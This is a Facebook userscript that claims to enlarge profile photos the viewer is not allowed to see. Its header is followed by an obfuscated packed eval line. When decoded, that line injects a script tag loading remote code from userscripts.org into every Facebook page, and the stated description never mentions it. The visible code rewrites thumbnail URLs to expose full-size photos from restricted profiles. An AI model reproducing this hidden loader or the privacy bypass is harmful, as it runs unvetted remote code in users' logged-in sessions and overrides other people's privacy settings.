// ==UserScript==
// @name            Facebook photo magnifier Plus
// @namespace       tag:brainonfire.net,2006-12-14:facebookphotozoom
// @description     Magnifies photos in Facebook search results that the user would not ordinarily be allowed to see. Currently, nothing fancy, just makes the photo thumbnail of each off-limits profile clickable for the normal-sized version.
// @include         http://*.facebook.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


var rez = document.getElementById("search_results");
if(rez)
{
	var imgs = rez.getElementsByTagName('img');
	if(imgs.length)
	{
		var img = undefined;
		var link = undefined;
		var par = undefined;
		var href = undefined;
		for(var i=0; i<imgs.length; i++)
		{
			img = imgs[i];
			par = img.parentNode;
			if(par.tagName.toLowerCase() === 'div')
			{
				href = img.getAttribute('src');
				href = href.replace(/\/s([0-9_]+)\.jpg$/, "/n$1.jpg");
				link = document.createElement('a');
				link.setAttribute('title', "Larger version, courtesy of facebook-photo-magnifier-0.1.user.js");
				link.setAttribute('href', href);
				par.removeChild(img);
				par.appendChild(link);
				link.appendChild(img);
			}
		}
	}
}
